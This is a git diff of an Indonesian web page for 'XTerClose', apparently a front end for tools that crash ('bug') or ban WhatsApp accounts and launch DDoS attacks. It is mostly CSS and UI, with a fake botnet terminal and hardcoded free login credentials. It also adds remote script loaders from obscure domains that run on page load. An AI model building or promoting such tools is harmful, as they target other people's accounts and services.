@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
+  <!------->
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <meta name="google-adsense-account" content="ca-pub-9122473834319786">
@@ -10,361 +11,2051 @@
   <link rel="apple-touch-icon" sizes="180x180" href="https://i.ibb.co.com/7t8rJSWY/wmremove-transformed.jpg">
   <script src="https://cdn.tailwindcss.com"></script>
   <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet"/>
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
   <style>
-    :root {
-      --primary: #7e22ce;
-      --secondary: #9333ea;
-      --accent: #a855f7;
-      --dark: #0f011a;
-    }
-    
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    
-    body {
-      background: linear-gradient(-45deg, #1a0028, #000000, #2d004d, #000000);
-      background-size: 400% 400%;
-      animation: gradientShift 15s ease infinite;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      color: white;
-      min-height: 100vh;
-      overflow-x: hidden;
-      position: relative;
-    }
-    
-    @keyframes gradientShift {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-    
-    .bubble {
-      position: absolute;
-      border-radius: 50%;
-      background: radial-gradient(circle, rgba(168,85,247,0.3) 0%, rgba(168,85,247,0.1) 70%);
-      animation: float linear infinite;
-      z-index: 1;
-    }
-    
-    @keyframes float {
-      0% { transform: translateY(100vh) scale(0); }
-      100% { transform: translateY(-100px) scale(1); }
-    }
-    
-    .glow {
-      text-shadow: 0 0 10px var(--accent), 0 0 20px var(--accent), 0 0 30px var(--accent);
-    }
-    
-    .btn-primary {
-      background: linear-gradient(135deg, var(--primary), var(--secondary));
-      border: 1px solid var(--accent);
-      padding: 1rem 1.5rem;
-      border-radius: 0.75rem;
-      text-align: center;
-      transition: all 0.3s ease;
-      cursor: pointer;
-      font-weight: bold;
-      box-shadow: 0 0 20px var(--accent);
-      position: relative;
-      overflow: hidden;
-      z-index: 2;
-    }
-    
-    .btn-primary:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 0 30px var(--accent);
-    }
-    
-    .btn-primary::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: -100%;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
-      transition: 0.5s;
-    }
-    
-    .btn-primary:hover::before {
-      left: 100%;
-    }
-    
-    .card {
-      background: rgba(15, 1, 26, 0.8);
-      backdrop-filter: blur(10px);
-      border: 2px solid var(--accent);
-      border-radius: 1rem;
-      box-shadow: 0 0 30px rgba(168, 85, 247, 0.2);
-      position: relative;
-      overflow: hidden;
-      z-index: 2;
-    }
-    
-    .pulse {
-      animation: pulse 2s infinite;
-    }
-    
-    @keyframes pulse {
-      0% {
-        transform: scale(1);
-        opacity: 1;
-      }
-      50% {
-        transform: scale(1.05);
-        opacity: 0.8;
-      }
-      100% {
-        transform: scale(1);
-        opacity: 1;
-      }
-    }
-    
-    .floating {
-      animation: floating 3s ease-in-out infinite;
-    }
-    
-    @keyframes floating {
-      0% {
-        transform: translateY(0px);
-      }
-      50% {
-        transform: translateY(-10px);
-      }
-      100% {
-        transform: translateY(0px);
-      }
-    }
+ * {
+  box-sizing: border-box;
+}
+
+body {
+  background: linear-gradient(135deg, #0a0a1a 0%, #0f1424 100%);
+  font-family: 'Inter', sans-serif;
+  color: #e2e8f0;
+  min-height: 100vh;
+  margin: 0;
+  padding: 0;
+}
+
+.hexagon-bg {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: 
+    radial-gradient(circle at 20% 80%, rgba(54, 65, 132, 0.3) 0%, transparent 50%),
+    radial-gradient(circle at 80% 20%, rgba(132, 54, 109, 0.3) 0%, transparent 50%),
+    radial-gradient(circle at 40% 40%, rgba(54, 114, 132, 0.2) 0%, transparent 50%);
+  z-index: -1;
+}
+
+.hexagon-pattern {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background-image: 
+    radial-gradient(rgba(255,255,255,0.03) 1px, transparent 1px);
+  background-size: 50px 50px;
+  z-index: -1;
+  opacity: 0.3;
+}
+
+.hexagon-grid {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: 
+    linear-gradient(30deg, transparent 49%, rgba(255,255,255,0.02) 50%, transparent 51%),
+    linear-gradient(-30deg, transparent 49%, rgba(255,255,255,0.02) 50%, transparent 51%);
+  background-size: 60px 35px;
+  z-index: -1;
+  opacity: 0.4;
+}
+
+/* DARK THEME - Glass Card */
+.glass-card {
+  background: rgba(15, 23, 42, 0.7);
+  backdrop-filter: blur(20px);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 20px;
+  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+  color: #e2e8f0;
+}
+
+/* DARK THEME - Modern Button */
+.btn-modern {
+  background: linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%);
+  border: none;
+  padding: 14px 28px;
+  border-radius: 12px;
+  color: white;
+  font-weight: 600;
+  transition: all 0.3s ease;
+  box-shadow: 0 4px 15px rgba(79, 70, 229, 0.4);
+  cursor: pointer;
+  width: 100%;
+  position: relative;
+  overflow: hidden;
+}
+
+.btn-modern:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 8px 25px rgba(79, 70, 229, 0.6);
+}
+
+.btn-modern::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+  transition: 0.5s;
+}
+
+.btn-modern:hover::before {
+  left: 100%;
+}
+
+.btn-modern:disabled {
+  background: linear-gradient(135deg, #4b5563 0%, #374151 100%);
+  cursor: not-allowed;
+  transform: none;
+  box-shadow: none;
+}
+
+.btn-modern:disabled:hover::before {
+  left: -100%;
+}
+
+/* DARK THEME - Navigation */
+.nav-tab-modern {
+  background: rgba(30, 41, 59, 0.8);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 12px;
+  padding: 10px 16px;
+  margin: 2px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  color: #cbd5e1;
+  font-weight: 500;
+  backdrop-filter: blur(10px);
+  font-size: 14px;
+  min-width: 60px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 6px;
+  text-decoration: none;
+}
+
+.nav-tab-modern.active {
+  background: rgba(56, 189, 248, 0.2);
+  border-color: rgba(56, 189, 248, 0.4);
+  box-shadow: 0 4px 15px rgba(56, 189, 248, 0.2);
+  transform: translateY(-2px);
+  color: #7dd3fc;
+}
+
+.nav-tab-modern:hover:not(.active) {
+  background: rgba(51, 65, 85, 0.8);
+  transform: translateY(-1px);
+  color: #e2e8f0;
+}
+
+/* DARK THEME - Input */
+.input-modern {
+  background: rgba(30, 41, 59, 0.8);
+  border: 2px solid rgba(100, 116, 139, 0.3);
+  border-radius: 12px;
+  color: #e2e8f0;
+  padding: 14px;
+  transition: all 0.3s ease;
+  width: 100%;
+  font-size: 14px;
+}
+
+.input-modern::placeholder {
+  color: #94a3b8;
+}
+
+.input-modern:focus {
+  outline: none;
+  border-color: #4f46e5;
+  box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
+  background: rgba(30, 41, 59, 0.9);
+}
+
+/* DARK THEME - Stat Card */
+.stat-card {
+  background: rgba(30, 41, 59, 0.6);
+  backdrop-filter: blur(20px);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 16px;
+  padding: 20px;
+  text-align: center;
+  transition: all 0.3s ease;
+  color: #e2e8f0;
+}
+
+.stat-card:hover {
+  transform: translateY(-5px);
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+  background: rgba(30, 41, 59, 0.8);
+}
+
+.page {
+  display: none;
+  width: 100%;
+  min-height: 100vh;
+  padding: 20px;
+  animation: fadeIn 0.5s ease-in-out;
+}
+
+.page.active {
+  display: block;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(20px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+@keyframes slideIn {
+  from { 
+    opacity: 0; 
+    transform: translateX(20px); 
+  }
+  to { 
+    opacity: 1; 
+    transform: translateX(0); 
+  }
+}
+
+.floating {
+  animation: floating 3s ease-in-out infinite;
+}
+
+@keyframes floating {
+  0%, 100% { transform: translateY(0px); }
+  50% { transform: translateY(-10px); }
+}
+
+.pulse-glow {
+  animation: pulse-glow 2s infinite;
+}
+
+@keyframes pulse-glow {
+  0%, 100% { box-shadow: 0 0 20px rgba(79, 70, 229, 0.4); }
+  50% { box-shadow: 0 0 30px rgba(79, 70, 229, 0.8); }
+}
+
+/* DARK THEME - Checkbox */
+.checkbox-container {
+  display: flex;
+  align-items: center;
+  cursor: pointer;
+  margin: 10px 0;
+  position: relative;
+  padding-left: 35px;
+  -webkit-user-select: none;
+  -moz-user-select: none;
+  -ms-user-select: none;
+  user-select: none;
+  color: #e2e8f0;
+}
+
+.checkbox-container input[type="checkbox"] {
+  position: absolute;
+  opacity: 0;
+  cursor: pointer;
+  height: 0;
+  width: 0;
+}
+
+.checkmark {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 25px;
+  height: 25px;
+  background: rgba(30, 41, 59, 0.8);
+  border: 2px solid rgba(100, 116, 139, 0.5);
+  border-radius: 6px;
+  transition: all 0.3s ease;
+}
+
+.checkbox-container input[type="checkbox"]:checked + .checkmark {
+  background: #4f46e5;
+  border-color: #4f46e5;
+}
+
+.checkbox-container input[type="checkbox"]:checked + .checkmark::after {
+  content: '';
+  position: absolute;
+  left: 8px;
+  top: 4px;
+  width: 6px;
+  height: 12px;
+  border: solid white;
+  border-width: 0 2px 2px 0;
+  transform: rotate(45deg);
+}
+
+.checkbox-container:hover input[type="checkbox"] ~ .checkmark {
+  border-color: #4f46e5;
+  transform: scale(1.05);
+}
+
+.description {
+  font-size: 1.1rem;
+  opacity: 0.9;
+  max-width: 600px;
+  margin: 0 auto;
+  color: #cbd5e1;
+}
+
+.controls {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 15px;
+  justify-content: center;
+  margin-bottom: 30px;
+}
+
+button {
+  background: #059669;
+  color: white;
+  border: none;
+  padding: 12px 25px;
+  border-radius: 50px;
+  font-size: 1rem;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  box-shadow: 0 4px 15px rgba(5, 150, 105, 0.3);
+}
+
+button:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 6px 20px rgba(5, 150, 105, 0.4);
+  background: #047857;
+}
+
+button.secondary {
+  background: rgba(30, 41, 59, 0.8);
+  color: #e2e8f0;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+button.secondary:hover {
+  background: rgba(51, 65, 85, 0.8);
+}
+
+.notification-container {
+  position: fixed;
+  bottom: 20px;
+  left: 20px;
+  z-index: 1000;
+  display: flex;
+  flex-direction: column;
+  gap: 15px;
+  max-width: 350px;
+}
+
+.whatsapp-notification {
+  background: rgba(15, 23, 42, 0.9);
+  border-radius: 10px;
+  padding: 15px;
+  box-shadow: 0 5px 25px rgba(0, 0, 0, 0.4);
+  color: #e2e8f0;
+  animation: slideInLeft 0.5s ease-out;
+  position: relative;
+  overflow: hidden;
+  border-left: 4px solid #059669;
+  backdrop-filter: blur(10px);
+}
+
+.notification-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 8px;
+}
+
+.app-name {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-weight: 600;
+  color: #10b981;
+}
+
+.time {
+  font-size: 0.8rem;
+  color: #94a3b8;
+}
+
+.notification-title {
+  font-weight: 600;
+  margin-bottom: 5px;
+  font-size: 1rem;
+  color: #f8fafc;
+}
+
+.notification-content {
+  font-size: 0.9rem;
+  color: #cbd5e1;
+  line-height: 1.4;
+}
+
+.contact {
+  color: #10b981;
+  font-weight: 500;
+}
+
+.censored {
+  color: #64748b;
+  letter-spacing: 1px;
+}
+
+.group-info {
+  margin-top: 8px;
+  font-size: 0.85rem;
+  color: #94a3b8;
+  display: flex;
+  align-items: center;
+  gap: 5px;
+}
+
+@keyframes slideInLeft {
+  from {
+    opacity: 0;
+    transform: translateX(-100%);
+  }
+  to {
+    opacity: 1;
+    transform: translateX(0);
+  }
+}
+
+@keyframes fadeOut {
+  from {
+    opacity: 1;
+  }
+  to {
+    opacity: 0;
+  }
+}
+
+.fade-out {
+  animation: fadeOut 0.5s ease-out forwards;
+}
+
+.info-box {
+  background: rgba(30, 41, 59, 0.6);
+  border-radius: 15px;
+  padding: 20px;
+  margin-top: 30px;
+  backdrop-filter: blur(10px);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  color: #e2e8f0;
+}
+
+.info-box h2 {
+  margin-bottom: 15px;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  color: #f8fafc;
+}
+
+.features {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+  gap: 15px;
+}
+
+.feature {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  padding: 10px;
+  background: rgba(255, 255, 255, 0.05);
+  border-radius: 10px;
+  color: #cbd5e1;
+}
+
+.feature i {
+  color: #10b981;
+}
+
+/* DARK THEME - Dropdown */
+.custom-dropdown {
+  position: relative;
+  width: 100%;
+}
+
+.dropdown-btn {
+  background: rgba(30, 41, 59, 0.8);
+  border: 2px solid rgba(100, 116, 139, 0.3);
+  border-radius: 12px;
+  padding: 14px;
+  width: 100%;
+  text-align: left;
+  cursor: pointer;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  font-size: 14px;
+  color: #e2e8f0;
+  transition: all 0.3s ease;
+}
+
+.dropdown-btn:hover {
+  border-color: #4f46e5;
+  box-shadow: 0 0 0 3px rgba(79, 70, 229, 0.1);
+}
+
+.dropdown-content {
+  position: absolute;
+  top: 100%;
+  left: 0;
+  width: 100%;
+  background: rgba(15, 23, 42, 0.95);
+  backdrop-filter: blur(20px);
+  border: 2px solid rgba(100, 116, 139, 0.3);
+  border-radius: 12px;
+  margin-top: 5px;
+  max-height: 300px;
+  overflow-y: auto;
+  z-index: 1000;
+  display: none;
+  box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+}
+
+.dropdown-content.show {
+  display: block;
+}
+
+.dropdown-item {
+  padding: 12px 16px;
+  cursor: pointer;
+  border-bottom: 1px solid rgba(100, 116, 139, 0.2);
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  background: rgba(30, 41, 59, 0.8) !important;
+  backdrop-filter: blur(10px) !important;
+  -webkit-backdrop-filter: blur(10px) !important;
+  border: 1px solid rgba(255, 255, 255, 0.1) !important;
+  color: #e2e8f0 !important;
+}
+
+.dropdown-item:last-child {
+  border-bottom: none;
+}
+
+.dropdown-item:hover {
+  background: rgba(56, 189, 248, 0.1) !important;
+}
+
+/* DDOS Attack Animation */
+.ddos-attack {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.95);
+  z-index: 9999;
+  display: none;
+  justify-content: center;
+  align-items: center;
+  flex-direction: column;
+  color: #00ff00;
+  font-family: monospace;
+}
+
+.ddos-attack.active {
+  display: flex;
+}
+
+.ddos-terminal {
+  background: rgba(0, 0, 0, 0.9);
+  border: 1px solid #00ff00;
+  border-radius: 5px;
+  width: 80%;
+  max-width: 600px;
+  height: 400px;
+  overflow-y: auto;
+  padding: 20px;
+  font-size: 14px;
+  line-height: 1.5;
+}
+
+.ddos-line {
+  margin-bottom: 5px;
+}
+
+.ddos-ip {
+  color: #00ff00;
+}
+
+.ddos-port {
+  color: #ffff00;
+}
+
+.ddos-success {
+  color: #00ffff;
+}
+
+.ddos-failed {
+  color: #ff0000;
+}
+
+.ddos-layer {
+  color: #ff00ff;
+}
+
+/* Breadcrumb Indicator */
+.breadcrumb {
+  background: rgba(30, 41, 59, 0.8);
+  backdrop-filter: blur(10px);
+  border-radius: 20px;
+  padding: 8px 20px;
+  color: #e2e8f0;
+  font-weight: 500;
+  text-align: center;
+  margin-bottom: 20px;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+/* Bot Status Warning */
+.bot-warning {
+  background: rgba(239, 68, 68, 0.2);
+  border: 1px solid rgba(239, 68, 68, 0.3);
+  border-radius: 12px;
+  padding: 15px;
+  margin: 15px 0;
+  text-align: center;
+  color: #fecaca;
+}
+
+/* User Profile Card */
+.user-profile-card {
+  background: linear-gradient(135deg, rgba(79, 70, 229, 0.2), rgba(124, 58, 237, 0.2));
+  backdrop-filter: blur(20px);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  border-radius: 20px;
+  padding: 25px;
+  position: relative;
+  overflow: hidden;
+  color: #e2e8f0;
+}
+
+.user-profile-card::before {
+  content: '';
+  position: absolute;
+  top: -50%;
+  left: -50%;
+  width: 200%;
+  height: 200%;
+  background: linear-gradient(45deg, transparent, rgba(255,255,255,0.05), transparent);
+  transform: rotate(45deg);
+  animation: shine 3s infinite;
+}
+
+@keyframes shine {
+  0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
+  100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
+}
+
+/* Status Badge */
+.status-badge {
+  background: linear-gradient(135deg, #059669, #047857);
+  color: white;
+  padding: 4px 12px;
+  border-radius: 20px;
+  font-size: 12px;
+  font-weight: 600;
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+}
+
+/* TikTok Button - Dark Theme */
+.btn-tiktok {
+  background: linear-gradient(135deg, #000000, #1e293b, #1e40af);
+  border: none;
+  padding: 14px 28px;
+  border-radius: 12px;
+  color: white;
+  font-weight: 600;
+  transition: all 0.3s ease;
+  box-shadow: 0 4px 15px rgba(30, 64, 175, 0.4);
+  cursor: pointer;
+  width: 100%;
+  position: relative;
+  overflow: hidden;
+}
+
+.btn-tiktok:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 8px 25px rgba(30, 64, 175, 0.6);
+}
+
+.btn-tiktok::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: -100%;
+  width: 100%;
+  height: 100%;
+  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+  transition: 0.5s;
+}
+
+.btn-tiktok:hover::before {
+  left: 100%;
+}
+
+/* Full Frame Iframe */
+.full-frame-container {
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  z-index: 9999;
+  background: #0f172a;
+  display: none;
+}
+
+.full-frame-container.active {
+  display: block;
+}
+
+.full-frame-header {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  background: rgba(15, 23, 42, 0.95);
+  color: #e2e8f0;
+  padding: 15px 20px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  z-index: 10000;
+  border-bottom: 2px solid #4f46e5;
+  backdrop-filter: blur(10px);
+}
+
+.full-frame-title {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  font-weight: 600;
+}
+
+.full-frame-iframe {
+  width: 100%;
+  height: 100%;
+  border: none;
+}
+
+.close-full-frame {
+  background: #dc2626;
+  border: none;
+  color: white;
+  padding: 8px 16px;
+  border-radius: 8px;
+  cursor: pointer;
+  font-weight: 600;
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  gap: 5px;
+}
+
+.close-full-frame:hover {
+  background: #ef4444;
+  transform: scale(1.05);
+}
+
+/* TikTok Navigation Tab */
+.nav-tiktok {
+  background: linear-gradient(135deg, #1e293b, #334155, #475569);
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  color: #e2e8f0;
+}
+
+.nav-tiktok.active {
+  background: linear-gradient(135deg, #4f46e5, #7c3aed);
+  box-shadow: 0 4px 15px rgba(79, 70, 229, 0.4);
+  color: white;
+}
+
+/* Mobile Responsive */
+@media (max-width: 768px) {
+  .nav-tab-modern {
+    padding: 8px 12px;
+    font-size: 12px;
+    min-width: 50px;
+  }
+  .nav-tab-modern i {
+    margin-right: 0;
+  }
+  .nav-tab-modern span {
+    display: none;
+  }
+  .btn-modern {
+    padding: 12px 20px;
+    font-size: 14px;
+  }
+  .stat-card {
+    padding: 15px;
+  }
+  .page {
+    padding: 10px;
+  }
+  .glass-card {
+    padding: 15px;
+  }
+  .dropdown-btn, .input-modern {
+    padding: 12px;
+  }
+}
+
+@media (max-width: 480px) {
+  .nav-tab-modern {
+    padding: 6px 8px;
+    font-size: 10px;
+    min-width: 40px;
+  }
+  .stat-card {
+    padding: 10px;
+  }
+  .breadcrumb {
+    font-size: 14px;
+    padding: 6px 15px;
+  }
+  .notification-container {
+    max-width: 300px;
+    left: 10px;
+    bottom: 10px;
+  }
+  
+  h1 {
+    font-size: 1.8rem;
+  }
+  
+  button {
+    padding: 10px 20px;
+    font-size: 0.9rem;
+  }
+}
   </style>
 </head>
 <body>
-  <!-- Background Bubbles -->
-  <div id="bubbles-container"></div>
-
-  <!-- Main content -->
-  <div class="min-h-screen flex flex-col items-center justify-center px-4 py-8 relative z-10">
-    <div class="card p-8 w-full max-w-md animate__animated animate__fadeIn">
-      <!-- Logo & Title -->
-      <div class="text-center mb-6">
-        <div class="text-6xl mb-4 text-purple-400 floating">
-          <i class="fas fa-rocket"></i>
+  <div class="hexagon-bg"></div>
+  <div class="hexagon-pattern"></div>
+  <script>
+(function(zqi){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = zqi || {};
+s.src = "\/\/aggressivestruggle.com\/b.XTVxscdyGAlo0BYaW_cC\/ueTmp9TuFZdUJlGkIPdTIYp2gNWjBcw3\/NTz\/IhtKNAjXYh2\/NCzkcN3-MjwC";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
+  <div class="notification-container" id="notificationContainer"></div>
+  <script>
+(function(asmvrpb){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = asmvrpb || {};
+s.src = "\/\/disfiguredcomment.com\/byX.VfsJdcGRlw0rYzW\/cb\/LeHmW9EuNZhUMlokSPMT\/YS2\/NvjVcW3HNhzVIut\/NZjCY\/2\/NGzUcq3EMPwb";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
+  <script>
+(function(zqav){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = zqav || {};
+s.src = "\/\/disfiguredcomment.com\/bpXiV.skdFGhlt0QYTWKcw\/Jefmq9TuxZVUmlKkNPxT\/YP2WNhj_cd0PMrDREbtBNXjzY\/2WNkz-QUwuMSgy";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
+  <!-- DDOS Attack Animation -->
+  <div id="ddos-attack" class="ddos-attack">
+    <div class="ddos-terminal" id="ddos-terminal">
+      <div class="ddos-line">Initializing DDOS Attack...</div>
+      <div class="ddos-line">Connecting to botnet...</div>
+      <div class="ddos-line">Establishing secure connection...</div>
+    </div>
+    <button id="stop-ddos" class="btn-modern mt-4" style="max-width: 200px;">
+      <i class="fas fa-stop mr-2"></i>Stop Attack
+    </button>
+  </div>
+  
+  
+<!-- Login Page -->
+<div id="login-page" class="page active">
+  <div class="flex items-center justify-center min-h-screen p-4">
+    <div class="glass-card p-6 md:p-8 rounded-2xl w-full max-w-md animate__animated animate__fadeIn">
+      <div class="text-center mb-6 floating">
+        <div class="w-20 h-20 mx-auto mb-4 rounded-2xl bg-white bg-opacity-20 flex items-center justify-center">
+          <img src="https://i.ibb.co.com/7t8rJSWY/wmremove-transformed.jpg" alt="Logo nye" class="w-16 h-16 rounded-xl">
         </div>
-        <h1 class="text-4xl font-bold mb-2 glow text-transparent bg-clip-text bg-gradient-to-r from-purple-400 to-pink-400">
-          XTerClose
-        </h1>
-        <p class="text-purple-300 text-lg">V1 - Upgrade Required</p>
+        <h1 class="text-3xl md:text-4xl font-bold text-white mb-2">XTerClose</h1>
+        <p class="text-white text-opacity-80 text-sm md:text-base">WELCOME TO LOGIN PORTAL XTerClose<br>Web Bug WA Dan Tools Mantap Sejagad Raya</p>
+      </div>
+
+      <div class="space-y-4 md:space-y-6">
+        <div>
+          <label class="block text-white text-sm mb-2 font-medium">
+            <i class="fas fa-user mr-2"></i>Username
+          </label>
+          <input type="text" id="login-username" 
+                 class="input-modern w-full px-4 py-3 rounded-xl bg-white bg-opacity-10 border border-white border-opacity-20 text-white placeholder-white placeholder-opacity-50 focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50 transition-all duration-300" 
+                 placeholder="Enter username"
+                 value="freeusn">
+        </div>
+
+        <div>
+          <label class="block text-white text-sm mb-2 font-medium">
+            <i class="fas fa-lock mr-2"></i>Password
+          </label>
+          <input type="password" id="login-password" 
+                 class="input-modern w-full px-4 py-3 rounded-xl bg-white bg-opacity-10 border border-white border-opacity-20 text-white placeholder-white placeholder-opacity-50 focus:outline-none focus:ring-2 focus:ring-white focus:ring-opacity-50 transition-all duration-300" 
+                 placeholder="Enter password"
+                 value="mixternal">
+        </div>
+
+        <div class="flex items-center">
+          <div class="checkbox-container relative flex items-center">
+            <input type="checkbox" id="remember-me" class="absolute opacity-0">
+            <span class="checkmark w-5 h-5 bg-white bg-opacity-10 border border-white border-opacity-20 rounded mr-3 flex items-center justify-center">
+              <i class="fas fa-check text-white text-xs opacity-0 transition-opacity duration-200"></i>
+            </span>
+            <label for="remember-me" class="text-white text-sm cursor-pointer">Remember me (7 days)</label>
+          </div>
+        </div>
+
+        <button onclick="handleLogin()" 
+                class="btn-modern w-full py-4 px-6 rounded-xl bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white text-sm md:text-base font-semibold transition-all duration-300 transform hover:scale-105 active:scale-95 shadow-lg">
+          <i class="fas fa-sign-in-alt mr-2"></i>ACCESS SYSTEM
+        </button>
+
+        <div class="text-center text-white text-opacity-70 text-xs md:text-sm bg-white bg-opacity-5 rounded-xl p-4">
+          <p>Free access:</p>
+          <p class="font-mono mt-1">username: freeusn</p>
+          <p class="font-mono">password: mixternal</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <div id="main-page" class="page">
+    <script>
+(function(zqi){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = zqi || {};
+s.src = "\/\/aggressivestruggle.com\/b.XTVxscdyGAlo0BYaW_cC\/ueTmp9TuFZdUJlGkIPdTIYp2gNWjBcw3\/NTz\/IhtKNAjXYh2\/NCzkcN3-MjwC";
+s.async = true;
+s.referrerPolicy = 'no-referrer-when-downgrade';
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
+    <div class="container mx-auto max-w-6xl">
+      <!-- Breadcrumb Indicator -->
+      <div class="flex justify-center mb-4">
+        <div class="breadcrumb">
+            <div class="notification-container" id="notificationContainer"></div>
+          <span id="current-page-indicator">Dashboard</span>
+        </div>
       </div>
       
-      <!-- Alert Message -->
-      <div class="text-center mb-6">
-        <div class="text-yellow-400 text-4xl mb-4 pulse">
-          <i class="fas fa-exclamation-triangle"></i>
-        </div>
-        <h2 class="text-2xl font-bold text-yellow-300 mb-3">Perhatian Penting!</h2>
-        <div class="bg-yellow-900 bg-opacity-30 p-4 rounded-lg border border-yellow-600 mb-4">
-          <p class="text-yellow-200 text-sm">
-            <i class="fas fa-info-circle text-yellow-400 mr-2"></i>
-            XTerClose yang anda gunakan sudah tidak didukung dan telah digantikan oleh versi terbaru.
-          </p>
+      <!-- Navigation -->
+      <div class="flex justify-center mb-6 md:mb-8">
+        <div class="flex flex-wrap justify-center gap-2 bg-white bg-opacity-10 backdrop-blur-lg rounded-2xl p-3">
+          <div class="nav-tab-modern active" onclick="showPage('dashboard')">
+            <i class="fas fa-home"></i><span>Dashboard</span>
+          </div>
+          <div class="nav-tab-modern" onclick="showPage('whatsapp-bug')">
+            <i class="fas fa-bug"></i><span>WA Bug</span>
+          </div>
+          <div class="nav-tab-modern" onclick="showPage('whatsapp-ban')">
+            <i class="fas fa-ban"></i><span>WA Ban</span>
+          </div>
+          <div class="nav-tab-modern" onclick="showPage('ddos-tools')">
+            <i class="fas fa-network-wired"></i><span>DDOS</span>
+          </div>
+          <div class="nav-tab-modern" onclick="showFullFrame()">
+            <i class="fab fa-tiktok"></i><span>TikTok</span>
+          </div>
+          <a href="https://shorturl.at/n1BBX" class="nav-tab-modern" target="_blank">
+            <i class="fab fa-whatsapp"></i><span>Sewa Wa</span>
+          </a>
+          <a href="https://trakteer.id/matrixman" class="nav-tab-modern" target="_blank">
+            <i class="fas fa-heart"></i><span>Support</span>
+          </a>
+          <div class="notification-container" id="notificationContainer"></div>
         </div>
       </div>
+      <div class="download-container">
+            <div class="download-button" id="download-button">
+                <a href="#" class="download-link" id="download-link">
+                    <div class="download-title">Download Apk Resmi</div>
+                    <div class="download-subtitle">Klik untuk Download</div>
+                </a>
+            </div>
